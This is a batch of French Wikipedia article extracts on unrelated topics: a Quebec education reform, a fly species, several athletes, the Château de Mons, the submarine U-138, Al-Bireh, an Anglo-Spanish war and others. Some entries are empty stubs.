Dans la foulée du rapport Parent sur l'éducation au Québec, les deux dernières années du cours classique ont été remplacées par le volet préuniversitaire de l'enseignement collégial et les premiers cégeps ouvrent à l'automne 1968. Les élèves qui avaient terminé le cours de rhétorique (sixième année du cours classique) au printemps de 1967 avaient la possibilité de compléter leurs deux années de philosophie; ils constituèrent ainsi la dernière cohorte du baccalauréat ès arts. Le Ministère de l'éducation du Québec reprend alors des universités la responsabilité de la sanction des études préuniversitaires en créant le diplôme d'études collégiales (DEC), successeur du baccalauréat ès arts.

</doc>
<doc id="7277558" url="https://fr.wikipedia.org/wiki?curid=7277558" title="Euxesta avala">
Euxesta avala

Euxesta avala est une espèce d'insectes diptères (mouches des fruits) de la famille des Tephritidae, originaire d'Amérique.
Synonymes.
Selon :
Distribution.
L'aire de répartition d"'Euxesta avala" s'étend en Amérique centrale (Antilles, Panama) et en Amérique du Sud (Venezuela).

</doc>
<doc id="7277564" url="https://fr.wikipedia.org/wiki?curid=7277564" title="Ɔ̰">
Ɔ̰

Ɔ̰ (minuscule : ɔ̰), appelé o ouvert tilde souscrit, est un graphème utilisé dans l’écriture du mbelime et du nateni.
Il s’agit de la lettre o ouvert diacritée d’un tilde souscrit.
Représentations informatiques.
L’o ouvert tilde souscrit peut être représenté avec les caractères Unicode suivants :

</doc>
<doc id="7277568" url="https://fr.wikipedia.org/wiki?curid=7277568" title="Chijindu Ujah">
Chijindu Ujah

Chijindu « CJ » Ujah (né le à Londres) est un athlète britannique, spécialiste du sprint. Champion du monde du relais 4 x 100 m à Londres en 2017, il est également double champion d'Europe de cette même épreuve à Amsterdam en 2016 et à Berlin en 2018. 
Biographie.
Chijindu Ujah remporte la médaille d'argent sur lors des Jeux de la Jeunesse du Commonwealth en 2011. En 2012, il bat son record personnel en 10 s 26 à Bedford, puis décroche la médaille d'or en 10 s 40 (avec un vent contraire de ) devant Denis Dimitrov et Robert Polkowski lors des Championnats d'Europe juniors de Rieti.
En 2014 à Hengelo, il descend pour la première fois sous les dix secondes sur avec un temps de 9 s 96 (+ 1,4 m/s). À cette occasion, il devient le troisième britannique le plus rapide sur cette distance alors qu'il avait au mieux réalisé un temps de 10 s 17 plus tôt dans l'année. Il réédite cette performance le 24 juillet 2015 à Londres avec un vent défavorable de 0,8 m/s.
Champion du monde et double champion d'Europe du 4 x 100 m (2016-2018).
En 2016, il devient champion d'Europe du relais 4 × 100 m à l'occasion des championnats d'Europe d'Amsterdam, en compagnie de James Dasaolu, Adam Gemili et James Ellington. Il se classe ensuite cinquième de cette épreuve Jeux olympiques de 2016 à Rio de Janeiro
Le 12 août 2017, avec le relais 4 x 100 m, il devient champion du monde à Londres en 37 s 47, battant par la même occasion le record d'Europe de 37 s 73 datant de 1998. Les Britanniques devancent les États-Unis (37 s 52) et le Japon (38 s 04). Le 24 août, lors du Weltklasse Zürich, étape finale de la Ligue de diamant et dans une nouvelle formule où le vainqueur de la finale remporte le trophée, il décroche le titre en s'imposant en 9 s 97 devant Ben Youssef Méité (9 s 97 également).
Le 7 août 2018, il termine à la place de la finale du 100 m des championnats d'Europe de Berlin en 10 s 06, derrière ses compatriotes Zharnel Hughes (9 s 95) et Reece Prescod (9 s 96) et le Turc Jak Ali Harvey (10 s 01). Cinq jours plus tard, avec le relais 4 x 100 m britannique, CJ Ujah est sacré une seconde fois champion d'Europe, en 37 s 80, devant la Turquie (37 s 98) et les Pays-Bas (38 s 03).
Médaille d'argent olympique mais suspension pour dopage (2021).
Aux Jeux Olympiques de Tokyo en août 2021, Ujah est aligné sur le relais 4 x 100 m en compagnie de ses coéquipiers Zharnel Hughes, Richard Kilty et Nethaneel Mitchell-Blake. Ensemble, ils décrochent la médaille d'argent en 37 s 51, le dernier relayeur italien Filippo Tortu battant d'un petit centième le dernier relayeur britannique Mitchell-Blake, pourtant en tête au dernier passage de témoin. Mais une semaine plus tard, l'athlète britannique est suspendu provisoirement après un test antidopage positif effectué par l'ITA (International Testing Agency) pendant les JO. Ce contrôle positif, qui révèle notamment la présence de deux substances interdites (de l'ostarine pour la prise de masse musculaire et du S-23), prive Ujah et ses coéquipiers de la médaille d'argent du 4 x 100 m. 

</doc>
<doc id="7277569" url="https://fr.wikipedia.org/wiki?curid=7277569" title="Château de Mons (Le Puy-en-Velay)">
Château de Mons (Le Puy-en-Velay)

Le château de Mons est un château situé au Puy-en-Velay, en France.
L'édifice est inscrit au titre des monuments historiques en 1995.
Histoire du château.
La première mention du château de « Montz » date de 1299. La famille de Polignac, l'une des plus illustres du Velay, en est alors vraisemblablement propriétaire, puisqu'Armand, vicomte de Polignac, s'en défait par donation le jour de la fête de saint Matthieu en 1331. Le nouveau propriétaire est son médecin, Jean de Murs (ou "de Muret"). Celui-ci s'en sépare peu de temps après, en le revendant en 1342 à Gilbert de St Germain Laprade, Seigneur de Mons. Au-delà de ces quelques faits disponibles dans les archives, peu de choses sont connues jusqu'au du château de Mons.
Au tournant du s, le sort du château est très lié à celui de la famille de La Tour Saint-Vidal. Son représentant le plus connu, Antoine II de La Tour Saint-Vidal, en est maître au moment où il entre en ligue, en , avec l’évêque Sennectère. Mons était l'une de ses possessions au milieu d'autres forteresses comme Saint-Vidal, Le Villard, Montvert, Saint-Quentin, Goudet, Beaufort et Eynac.
Après la mort d'Antoine II en 1591, la propriété resta dans la famille de La Tour Saint-Vidal, y compris après 1593, année où Henri IV abjure son protestantisme. Elle fut temporairement occupée entre 1594 et 1596, comme d'autres lieux de la région, par le duc de Ventadour qui assiège le Puy.
Pierre Antoine de La Tour de Rochefort, baron de Saint-Vidal, vend le château à Hugues Spert vers 1634-1635. Ce dernier se fixa à Mons après que son château de Volhac a été brûlé par les soldats du duc de Ventadour.
Hugues Spert mourrut le , laissant la réputation . Un an après sa mort, le château fut la cible d'une attaque à caractère privé : Charles de Molette, seigneur de Morangiers, tenta d'enlever sa fille, Marie Isabeau Spert, pour l'épouser. Le peu de discrétion des assaillants fit échouer leur plan.
Un siècle s'écoule jusqu'à ce que s'y installe une maison de vacances et de repos du grand séminaire du Puy en 1759, tandis que les jésuites avaient une maison de campagne dans un autre château, celui de l'Ours. Tous deux furent chassés de leur propriété à la Révolution.
En 1839, les jésuites échouent à racheter le château de l'Ours, devenu privé, en raison du prix demandé. Le séminaire du Puy n'étant plus intéressé par Mons, ils acquièrent finalement le château et ses dépendances la même année.
Entre 1840 et 1842, la congrégation remit en état le château, et y ajouta une chapelle. Les extérieurs furent aussi réaménagés, le mur de soutènement reconstruit, et un vieux colombier fut transformé en chapelle à la Vierge.
Après l'expulsion des congrégations de 1880, les jésuites quittèrent les lieux. Le château fut acquis par deux familles amies, les Verac et les Sinéty, qui le laissèrent à la disposition du diocèse et de la Compagnie. À leur retour en 1919, les jésuites fréquentèrent à nouveau le château pendant les jours de repos du jeudi et les étés.
Au milieu du , la Société Borne et Dolaizon en devient propriétaire, et entreprend en 1959 une étude pour le faire inscrire à l'inventaire supplémentaire des monuments historiques.
En 1962-1963, la propriété fut toutefois acquise par les Pères Blancs de Vals, puis par le Pensionnat Notre-Dame de France, qui construisent un stade.
Ce n'est qu'en 1995, alors que le château menace de ruine, que l'inscription aux monuments historiques sera effective, après l'acquisition du lieu par Soleilhant. L'aile sud, rajoutée tardivement, en est exclue.
Au cours du , le château a également connu des travaux d'intérieur, avec notamment des fresques attribuées à l'artiste André Bouler.
En 1994 fut créée l'Association de Sauvegarde du Château de Mons et de son environnement. Elle lança en 1996 un appel public pour son éventuel achat en participation, et pour la restauration de sa toiture, afin d'assurer la conservation du bâtiment.
Contexte historique local et national.
Les Polignac.
Les Polignac forment la famille la plus illustre du Velay, celle qui essaiera en vain durant des siècles de disputer aux évêques du Puy leur pouvoir temporel. Sa généalogie est toujours restée sujette à caution avant le . Armand, Vicomte de Polignac, époux de Catherine de Bouzols, est membre de cette lignée. Après la donation du château, il ne conserva que la haute justice et le domaine en arrière-fief.
On a fait des Polignac les premiers vicomtes du Velay dès la fin , au vu de documents très postérieurs ou mal compris. Le "castrum Podemniacensis", même s’il paraît très ancien, ne semble leur appartenir vraiment qu’à la fin du . On a également confondu cette maison avec celle des Dalmas, ou même celle des Nonette, à partir de certaines conjectures sur les noms. Il est bon de reprendre les différents maillons de la lignée, en partant d’Armand, l’un des premiers vicomtes qu’aient connus l’Auvergne et le Velay, et qui est cité plusieurs fois dans les chartes de Brioude à la fin du et au début du . Ses donations ont lieu indifféremment en Velay ou en Brivadois, mais il est cependant expressément identifié par ailleurs comme vicomte en Velay. Armand II n’est pas vicomte, mais qualifié de filius Armanni vicecomitis par la chronique de l'abbaye Saint-Philibert de Tournus, dont les Polignac sont les bienfaiteurs en Velay aux .
Après Armand II se succèdent deux vicomtes théoriquement du ressort vellave : Étienne, qu’on a parfois confondu avec le fils de Bertrand et d’Emilgarde, malgré les noms différents de leurs épouses et la distance entre leurs biens et Agne. On ne peut affirmer qu’ils sont fils et petit-fils d’Armand II, malgré leur apparition suivie dans la chronique de Tournus ; ils ont la charge vicomtale en Velay, comme les Dalmas en Brivadois. Vient ensuite Armand III dont le nom est un indice de filiation plus sûr. Il vit dans la première moitié du et avec lui la généalogie devient solide. On peut alors suivre les travaux traditionnels la concernant Un cercle de forteresses majoritairement ennemies entoure le Puy. La plupart des combats correspondent aux efforts pour attaquer ou dégager la ville. Beaucoup de places fortes vont changer de mains au cours des opérations. Mons avait une position stratégique importante.
Gabrielle Blanc, une bourgeoise, veuve de Antoine Vallat, notaire gît dans son jardin attenant au château de Mons et dicte son testament. Notaires et témoins se tiennent à distance dans un verger voisin. Les six derniers mois de 1586, de septembre à octobre surtout la peste fait rage et fait planer une sombre crainte.
Gouverneur de Saint-Vidal.
Antoine II de la Tour Saint-Vidal, possédait une assise territoriale importante en Velay avec des seigneuries comme Saint-Vidal, Saint-Quentin, Mons, Goudet et aussi en Gévaudan comme baron de Cénaret et Comtor de Montferrand. Il est devenu le personnage le plus en vue du et ce n’est pas par hasard. La famille était puissante, trois siècles d’habiles alliances avaient agrandi leurs possessions. C’est surtout grâce à ses actions lors des guerres de Religion - il luttera surtout en Velay, Vivarais et Gévaudan - qu’il sera le plus connu. Réputé pour sa bravoure, il sera toujours le premier aux postes les plus difficiles et le paiera par trois fois de blessures. Fort de l’héritage familial et de l’apport d’un mariage avantageux, il s’appuie sur des forteresses (Saint-Vidal, Le Villard, Montvert, Saint-Quentin, Mons, Goudet, Beaufort et Eynac) placées de façon à lui assurer une forte emprise.
Toutefois la politique familiale d’acquisitions tourne court et après sa mort, les biens de sa maison furent partagés et passèrent pour la plupart à d’autres familles. L’apparition de la Réforme crée un vaste conflit, mi-religieux, mi-politique, des guerres de Religion qui affecte pendant trente ans le Velay comme le reste du royaume.
Le septembre 1589, le moine Jacques Clément, armé par les ligueurs assassine Henri III. Les villes se rallient et se font amnistier après qu'Henri IV a abjuré son protestantisme.
La veille de la Trinité 1594, vint le duc de Ventadour, avec son armée, étant environ quatre mille, à la réquisition du dit Chaste et sa femme la vicomtesse, pour nous faire reconnaître le roi de Navarre comme vous l’entendrez ci-après; autrement, disaient-ils, qu’ils voulaient exécuter leur arrêt à Paris, précisant que la ville sera rasée et démolie si ce n’est l’église de Notre-Dame. Ils sont venus loger à Brives, à Villeneuve et au Château de Mons qui leur fut rendu par Madame de St Vidal. Ils sont venus courir sur les pauvres manœuvres qui étaient aux champs, jusqu’à nos portes. Mais malgré la grande troupe qu’ils étaient, les nôtres allaient pas moins les attaquer tous les jours. Et la veille de St Laurent, ils sont allés quérir leur canon, pour l’amener devant Jandriac et étant là-haut au devant d’aiguille, toute leur infanterie défendue entre les Vignes, fuyant les manœuvres
Enfin le 5 avril 1596 la paix devient définitive au Puy. Vente faite par Pierre Morel à Jean Philibert de sa métairie de Mons en 1614.
Les Spert.
À la suite de l'attaque du château décrite plus haut, Marie Isabeau Spert épousait Jacques-Hubert Pradier d’Angrain, seigneur de Saint-Julien, lieutenant criminel en la sénéchaussée du Puy.
Les jésuites.
Comme la Compagnie n'était pas motorisée, ses membres faisaient le trajet de Vals à Mons et retour à pied en suivant des itinéraires, à l'époque assez compliques mais encore champêtres. De Bonald demanda au Recteur l'aide des scolastiques pour catéchiser les paroisses de la ville et des campagnes en 1834, ce service est assuré, au Puy dans les paroisses du Collège et des Carmes, et aux environs du Puy dans les villages de Vals, Mons, Taulhac, Brives, Dolaizon, La Roche et Eycenac (Mons et Taulhac dépendent de la paroisse des Carmes, Dolaizon, La Roche et Eycenac de la paroisse de saint Christophe sur Dolaizon). En 1539 s'y ajoutent Tallobre (saint Christophe), Cheyrac (Polignac), Malpas (Cussac), Tressac (Polignac), Fay la Triouleyre (saint Germain Laprade), Jabler (saint Christophe), Bilhac environs du Puy dans les villages de Vals, Mons, Taulhac, Brives, Dolaizon, La Roche et Eycenac (Mons et cette présence, interrompue par l'expulsion de 1880, reprise en 1897, cesse de nouveau en 1901. Dès 1919, aussitôt après le retour à Vals, dix-neuf villages sont visités régulièrement. En 1922, les Frères ont repris les catéchismes à Charentus (Coubon), les Estreys (Polignac), Fay (saint Germain), Jabier (saint Christophe), Malpas (Cussac), Narnhac Polignac), Mons (les Carmes), Orzilhac. Les voici, à partir de 1923, à Bilhac (Polignac), à Taulhac (les Carmes), à partir de 1924 à Chambeyrac (Polignac), à partir de 1927 à Chanceaux. À partir de 1935 à Cheyrac (Polignac), Eycenac (saint Christophe), Narminhac (Polignac) En 1936, d'après le catalogue de la province de Toulouse, 47 scolastiques sur les 70 présents du séminaire, sont engagés dans ces catéchismes. (Coubon), Ours (Les Carmes), Rochelimagne (Polignac), Tallobre (saint Christophe), Tressac (Polignac) et Vals.
En 1940, ils assurent, en outre, le service à Bouzols (Arsac), Chadrac (saint Laurent), Coubon, Dolaizon (saint Christophe), Fareyrolles (sanssac), Nolhac (saint Paulien), Polignac, Tallode (saint Christophe), Vourzac (Sanssac).

</doc>
<doc id="7277583" url="https://fr.wikipedia.org/wiki?curid=7277583" title="Pavel Ivashko">
Pavel Ivashko

Pavel Ivashko (né le à Sourgout) est un athlète russe, spécialiste du 400 mètres.
Biographie.
Il remporte en 46 s 39 le titre de champion russe junior à Kazan le , avant de remporter la médaille d'or lors des Championnats d'Europe juniors à Rieti en battant le record national junior, en 45 s 81. Deux jours après, le , il remporte également le titre du relais 4 x 400 m, en battant le record national junior.
Le , il porte le record de Russie du relais 4 x 400 m à 2 min 59 s 45, avec ses coéquipiers Artyom Denmukhametov, Pavel Trenikhin et Denis Kudryavtsev, en série des Championnats du monde à Pékin (précédents record de 2008 et 2014 annulés pour disqualification tardive).

</doc>
<doc id="7277589" url="https://fr.wikipedia.org/wiki?curid=7277589" title="Kuttanad">
Kuttanad

Le Kuttanad (en ) est une région de l'État du Kerala, en Inde. Elle s'étend au sud du Lac Vembanad, dans les districts d'Alappuzha, de Pathanamthitta et de Kottayam. La région est reconnue pour ses rizières pittoresques. Le Kuttanad est la région de plus faible altitude en Inde et l'un des rares endroits dans le monde où l'agriculture est pratiquée sous le niveau de la mer.

</doc>
<doc id="7277594" url="https://fr.wikipedia.org/wiki?curid=7277594" title="Lucien Noullez">
Lucien Noullez

Lucien Noullez, né le à Etterbeek et mort le à Anderlecht, est un poète, diariste et critique littéraire belge.
Biographie.
Né dans un milieu qui aime la musique et la chanson, Lucien Noullez, tout naturellement, passe beaucoup de temps au concert, écrit sur la musique et en nourrit ses poèmes.
Professeur de religion, il a aussi été chroniqueur à "La Libre Belgique", et critique littéraire au "Journal des poètes", à "Indications", "Marginales", "La Cité", "La Revue Nouvelle", "La Revue générale", à "Recours au poème".
Plusieurs récompenses consacrent son travail poétique : prix Casterman, prix Polak de l' Académie royale de langue et de littérature françaises de Belgique, prix Robert-Goffin, prix Maurice et Gisèle Gauchez-Philippot.
Il obtient également, en 1997, le prix Maurice Carême.
Il a été président de la Maison internationale de poésie Arthur Haulot.

</doc>
<doc id="7277597" url="https://fr.wikipedia.org/wiki?curid=7277597" title="Oksana Kondrateva">
Oksana Kondrateva



</doc>
<doc id="7277601" url="https://fr.wikipedia.org/wiki?curid=7277601" title="Jardin national d’Athènes">
Jardin national d’Athènes



</doc>
<doc id="7277605" url="https://fr.wikipedia.org/wiki?curid=7277605" title="Palais présidentiel d’Athènes">
Palais présidentiel d’Athènes



</doc>
<doc id="7277609" url="https://fr.wikipedia.org/wiki?curid=7277609" title="Unterseeboot 138 (1940)">
Unterseeboot 138 (1940)

L' Unterseeboot 138 ou U-138 est un sous-marin allemand (U-Boot) de type II.D utilisé par la Kriegsmarine pendant la Seconde Guerre mondiale.
Comme les sous-marins de type II étaient trop petits pour des missions de combat dans l'océan Atlantique, il a été affecté principalement dans la mer du Nord et à la surveillance côtière.
Historique.
Mis en service le , l'U-138 a servi comme sous-marin d'entrainement et de navire-école pour les équipages d'abord au sein de la 1. Unterseebootsflottille à Kiel.
Le , l'U-138 devient opérationnel toujours dans la 1. Unterseebootsflottille à Kiel.
Il appareille le du port de Kiel pour sa première patrouille sous les ordres de l'Oberleutnant zur See "Wolfgang Lüth" et rejoint la base sous-marine de Lorient le , après 17 jours en mer. Il y coule 4 navires marchands pour un total de tonneaux.
Sa deuxième patrouille débute le , pour une période de 12 jours en mer et retourne à Lorient le , coulant un navire de tonneaux et en endommageant un autre de tonneaux.
Le , l'Oberleutnant zur See "Wolfgang Lüth" cède le commandement de l'U-138 à "Peter Lohmeyer".
Grâce aux succès de ces 2 patrouilles, l'Oberleutnant zur See "Wolfgang Lüth" est décoré le de la Croix de chevalier de la Croix de fer.
Sa troisième patrouille, du au , soit 27 jours en mer, ramène l'U-138 de Lorient à Kiel.
Il quitte le service active du janvier au au sein de la 22. Unterseebootsflottille à Gotenhafen, puis redevient opérationnel le . Entre-temps, l'Oberleutnant zur See "Franz Gramitzky" amène l'U-138 de Kiel à Bergen en Norvège du 20 au , soit 5 jours en mer.
Sa quatrième patrouille, partant de Bergen le , ramène l'U-138 à Lorient qu'il atteint le , après 16 jours en mer et après avoir coulé 1 navire marchand de tonneaux.
Sa cinquième et dernière patrouille de guerre commence le au départ de Lorient pour une mission dans le détroit de Gibraltar. Après 7 jours en mer, le , il est repéré en surface au radar par le destroyer britannique à l'ouest de Cadix en Espagne et est coulé à la position géographique de par des charges de profondeur lancées par les destroyers britanniques HMS "Faulknor", , , et . L'U-138 endommagé refait surface avant de sombrer. Les 27 membres d'équipage sont recueillis par le HMS "Faulknor".
Navires coulés.
L'Unterseeboot 138 a coulé 6 navires marchands ennemis pour un total de tonneaux et endommagé 1 navire marchand de tonneaux au cours des 5 patrouilles (79 jours en mer) qu'il effectua.

</doc>
<doc id="7277611" url="https://fr.wikipedia.org/wiki?curid=7277611" title="Al-Bireh">
Al-Bireh

al-Bireh, al-Birah ou el-Bira () est une ville palestinienne adjacente à Ramallah au centre de la Cisjordanie, à au nord de Jérusalem. La ville est située à une altitude de 884 mètres approximativement.
Selon le Bureau palestinien des statistiques, al-Bireh avait une population de en 2007. Le maire de la ville est Fawzi Abed qui a été élu en 2012.
Étymologie.
Son nom signifie « l'eau de puits ». On dit que l'origine de ce mot dérivé de "Be'rot" (), un mot cananéen. Beéroth est mentionné dans la Bible.
Histoire.
On dit que la ville d'al-Bireh a été fondée en 3500 approximativement à l'époque cananéenne.
Les croisés ont capturé et ont appelé la ville Birra. Ils ont construit un château, une église et un hospice là. Les deux derniers bâtiments ont été construits par les Templiers en 1146 et ont appartenu à l'église du Saint-Sépulcre. L'Ayyoubides sous le règne de Saladin a fait démarrer les croisés de Birra quand ils ont reconquis la Palestine intérieure après la bataille de Hattin en 1187 et ont démoli complètement la ville. Yaqout al-Rumi mentionne de voir les ruines quelquefois pendant ses voyages dans la région. En approchant de la fin de règle d'Ayyoubides, en 1280, la ville moderne d'al-Bireh était un village habité. L'Ayyoubides a construit une mosquée dans la ville consacrée à Omar ibn al-Khattab adjacent aux ruines de l'église. Jusqu'en 1917, la ville a servi de centre politique et administratif pour l'Empire ottoman.
Le 6 juin 1967, les troupes israéliennes ont pris le contrôle de la ville pendant la guerre des Six Jours. En 1994, l'administration civile de la ville a été retournée à l'autorité palestinienne selon les accords d'Oslo.
Démographie.
al-Bireh avait une population de en 1922. En 1931, La ville comptait . Le nombre est passé à en 1945.
Selon le Bureau palestinien des statistiques, al-Bireh avait une population de en 1997 dont la répartition par sexe était 50 % masculine et 50 % féminine exactement. En 2007, la ville comptait .
Éducation.
La première école dans la ville a été fondée en 1908 et la première école de filles a été fondée en 1927.
Il y a trois types d'écoles dans la ville :
Sport.
La construction de l'Al-Bireh international stadium a été terminée en 2010. Elle a été financée par la France, la banque allemande de développement, l'Agence de développement des Nations unies et la FIFA. À un coût de 3 millions d'euros.
Le Centre palestinien du judo, du karaté et d'aérobic est situé à al-Bireh

</doc>
<doc id="7277614" url="https://fr.wikipedia.org/wiki?curid=7277614" title="Université d’économie d’Athènes">
Université d’économie d’Athènes



</doc>
<doc id="7277619" url="https://fr.wikipedia.org/wiki?curid=7277619" title="Ariel Martínez">
Ariel Martínez

Ariel Martínez est un footballeur international cubain né le à Sancti Spíritus (Sancti Spíritus, Cuba). Il joue au poste d'ailier. Engagé avec la sélection nationale cubaine durant la Gold Cup 2015 aux États-Unis, il déserte.
Biographie.
En club.
Le , il reçoit l'autorisation administrative nécessaire et signe avec le Battery de Charleston en USL. Il ne peut finalement pas disputer la rencontre de séries éliminatoires du samedi suivant contre les Kickers de Richmond en raison d'un obstacle administratif négligé précédemment.
Pour la saison 2016, il rejoint le Miami FC 
En sélection.
Il débute avec la sélection nationale senior le à l'occasion d'un match de qualification à la Coupe caribéenne des nations 2007 contre les îles Turques-et-Caïques (victoire 6-0).
Le , il inscrit un triplé lors de la victoire historique 4-0 des cubains contre le Belize pour se qualifier en quart-de-finale de la Gold Cup 2013 en rattrapant la différence de buts sur les Martiniquais.
Exactement deux années plus tard, le , il choisit d'abandonner l'équipe cubaine juste après la victoire sur le Guatemala, qui avait offert aux siens la qualification pour les quarts-de-finale de la Gold Cup 2015.

</doc>
<doc id="7277628" url="https://fr.wikipedia.org/wiki?curid=7277628" title="Université de Saida">
Université de Saida



</doc>
<doc id="7277632" url="https://fr.wikipedia.org/wiki?curid=7277632" title="Manfred Jung">
Manfred Jung

Manfred Jung (né le à Oberhausen et mort le à Essen) est un ténor allemand et chanteur d'opéra. Il est notamment connu pour avoir interprété le rôle de Siegfried dans "L'Anneau du Nibelung" de Richard Wagner au Festival de Bayreuth sous la direction de Pierre Boulez, dans la mise en scène de Patrice Chéreau.
Biographie.
Manfred Jung reçoit tout d'abord une formation d'ingénieur électricien, avant d'être employé comme technicien de l'éclairage au théâtre de la ville d'Essen. Là, il étudie le chant à la "Folkwang-Musikhochschule" avec le professeur Hilde Wesselmann ; il en sort en 1968 après avoir passé l'examen d’État.
Il fait ses débuts en 1967 lors du Festival des jeunes artistes de Bayreuth (à l'époque, "Internationale Jugend-Festspieltreffen, Bayreuth"), dans le rôle d'Arindal, de l'opéra de jeunesse de Richard Wagner, "Die Feen". 

</doc>
<doc id="7277636" url="https://fr.wikipedia.org/wiki?curid=7277636" title="Petits bonheurs posthumes (12 nouvelles chansons de Brassens)">
Petits bonheurs posthumes (12 nouvelles chansons de Brassens)



</doc>
<doc id="7277639" url="https://fr.wikipedia.org/wiki?curid=7277639" title="Guerre anglo-espagnole (1625-1630)">
Guerre anglo-espagnole (1625-1630)

La guerre anglo-espagnole est un conflit opposant l'Espagne au royaume d'Angleterre et aux Provinces-Unies entre 1625 et 1630. Ce conflit se situe dans le contexte plus général de la guerre de Trente Ans et de la guerre de Quatre-Vingts Ans.
Contexte.
La guerre de Quatre-Vingts Ans opposant les Provinces-Unies à l'Espagne de Philippe IV avait repris en 1621 après une trêve de douze ans. L'Angleterre sous Élisabeth avait déjà apporté une assistance aux Provinces-Unies en finançant une expédition ou indirectement par la guerre de course menée contre les galions et les ports espagnols.
Par ailleurs, la guerre de Trente Ans (1618-1648) faisait rage en Europe. Frédéric V du Palatinat et sa femme Élisabeth Stuart, fille du roi d'Angleterre Jacques, avaient été vaincus et dépossédés par les Tercios espagnols
L'échec du mariage espagnol du Prince de Galles en 1623 réduit à néant toute idée de rapprochement entre les deux royaumes. En , Jacques Ier, jusqu'alors plutôt pacifiste mais affaibli par la maladie et de plus en plus sous la coupe de son favori le duc de Buckingham, déclare la guerre à l'Espagne. Il décède en . Mais son fils et successeur Charles, avait poussé en avant les préparatifs de guerre avec l'aide de Buckingham.
Expédition de Cadix.
L'expédition de Cadix confiée à Sir Edward Cecil fut un échec pour l'Angleterre qui y perdit une grande partie de sa flotte et plus de hommes sans affaiblir en rien la puissance espagnole.
Les opérations en France.
En 1625, le duc de Buckingham négocie parallèlement avec le cardinal Richelieu l'aide française contre les Espagnols qui occupent le Palatinat en échange d'un appui des navires anglais dans sa lutte contre les huguenots français. Mais le Parlement anglais est horrifié à l'idée de combattre contre des protestants français. Ce plan ne faisait qu'alimenter les craintes d'un retour au catholicisme à la Cour. Buckingham renversa les alliances en optant pour une politique de soutien aux huguenots français.
Les Anglais ne furent pas plus heureux contre les Français. Défaits au siège de Saint-Martin-de-Ré et à celui de La Rochelle, ils perdirent plus de . Buckingham est assassiné le .
Aux Antilles.
En 1629, une expédition navale espagnole, commandée par l'amiral Don Fadrique de Tolède a été armée pour détruire les comptoirs anglais et français récemment installés sur les îles des Caraïbes de Saint-Kitts-et-Nevis. Ces territoires étaient revendiqués par l'Espagne depuis leurs découvertes en 1498. Les colonies anglaises et françaises étaient considérées comme une menace pour les Antilles espagnoles. La bataille de Saint-Kitts est gagnée par les Espagnols ; les comptoirs français et anglais sont détruits.
Conséquences.
La guerre s'est avéré un fiasco coûteux pour l'Angleterre et l’Écosse. En 1630, Philippe IV et Charles signent une paix blanche par le traité de Madrid. En Angleterre, les coûts de la guerre et la mauvaise gestion ont attisé les différends entre la monarchie et le Parlement anglais annonciateurs de la guerre civile anglaise.

</doc>
<doc id="7277640" url="https://fr.wikipedia.org/wiki?curid=7277640" title="Patryk Dobek">
Patryk Dobek

Patryk Dobek (né le à Kościerzyna) est un athlète polonais, spécialiste du 400 mètres, du 400 mètres haies et du 800 mètres. Il décroche une médaille de bronze sur 800 m aux Jeux Olympiques de 2020 à Tokyo.
Biographie.
Il fait partie du relais 4 × 400 m lors des Jeux olympiques de Londres en tant que réserve.
À Rieti, lors des championnats d'Europe juniors 2013, il bat son record personnel sur en pour remporter la médaille d'argent, derrière le Russe Pavel Ivashko.
Il se révèle lors de la saison 2015 en prenant la deuxième place du des championnats d'Europe par équipes en approchant la barrière des 49 secondes. Il remporte par la suite les championnats d'Europe espoirs en portant son record personnel à , puis se classe septième des championnats du monde de Pékin, en .
Troisième des universiades d'été de 2019, il s'impose lors des championnats d'Europe par équipes 2019.
À partir de 2020, Patryk Dobek décide de concourir sur la distance du . Lors des championnats d'Europe en salle 2021 à Toruń, il établit un nouveau record personnel en finale () pour remporter la médaille d'or, devant son compatriote Mateusz Borkowski et le Britannique Jamie Webb.
Le 20 juin 2021, il réalise sur à Chorzów.

</doc>
<doc id="7277650" url="https://fr.wikipedia.org/wiki?curid=7277650" title="Mesud Pezer">
Mesud Pezer

Mesud Pezer (né le ) est un athlète bosnien, spécialiste du lancer de poids et du lancer de disque.
Carrière.
Avec 20,44 m, record national junior au poids de 6 kg, il remporte la médaille d'or des Championnats d'Europe juniors à Rieti le . Puis, le , il termine 4e du lancer de disque en barrant le record national junior. Il termine 5e des Championnats du monde juniors en 2012. 
Le , il bat le record national espoirs, en 19,44 m et remporte le titre espoirs de la Coupe d'Europe hivernale des lancers à Leiria. en 20,37 m lors des Championnats d'Europe en salle 2017, il remporte ensuite en 20,68 m le titre sénior de la Coupe d'Europe hivernale des lancers 2017 à Las Palmas.
Le , Pezer termine des championnats du monde en salle de Birmingham avec un jet à 21,15 m, record national en salle.
En 2019, Mesud Pezer améliore son record national qui datait de 2017 en lançant le poids à lors du meeting de Växjö.
Il est nommé porte-drapeau de la délégation de Bosnie-Herzégovine aux Jeux olympiques d'été de 2024 à Paris aux côtés de la judokate Larisa Cerić.

</doc>
<doc id="7277660" url="https://fr.wikipedia.org/wiki?curid=7277660" title="American Cancer Society">
American Cancer Society

La (ACS) est une organisation à but non lucratif américaine créée en 1913 pour lutter contre le cancer. Son siège est à Atlanta.
Histoire.
La société a originellement été fondée le par quinze médecins et hommes d'affaires à New York sous le nom de "American Society for the Control of Cancer" ("ASCC"). Le nom actuel est adopté en 1945. À l'époque durant laquelle la société a été fondée, il était difficile de prononcer le mot en public ; de décès étaient lié au cancer rien qu'aux États-Unis. Le symbole est adopté par la American Cancer Society en 1928, et créé par George E. Durant de Brooklyn, New York.
Organisation institutionnelle.
La société s'organise en douze divisions géographiques du domaine médical et recense des volontaires employés dans américains. Ses bureaux principaux sont localisés au à Atlanta.

</doc>
<doc id="7277663" url="https://fr.wikipedia.org/wiki?curid=7277663" title="Zou Zhenxian">
Zou Zhenxian

Zou Zhenxian, né le dans la province du Liaoning, est un athlète chinois, spécialiste du triple saut.
Biographie.
Lors de la Coupe du monde 1981 à Rome, il porte son record à , record chinois jusqu'en 2009.
Il participe aux Jeux olympiques d'été de 1988 à Séoul, obtenant la quatrième place avec un saut de .

</doc>
<doc id="7277664" url="https://fr.wikipedia.org/wiki?curid=7277664" title="Korbinian Brodmann">
Korbinian Brodmann

Korbinian Brodmann, né le à Liggersdorf dans le Hohenzollern, près de Constance dans l'actuel Bade-Wurtemberg et mort le à Munich, d'une pneumonie, est un neurologue et neurophysiologiste allemand.
Biographie et travaux scientifiques.
Il est étudiant en médecine successivement à Munich, Wurtzbourg, Berlin puis Fribourg-en-Brisgau où il obtient son habilitation à la pratique médicale en 1895.
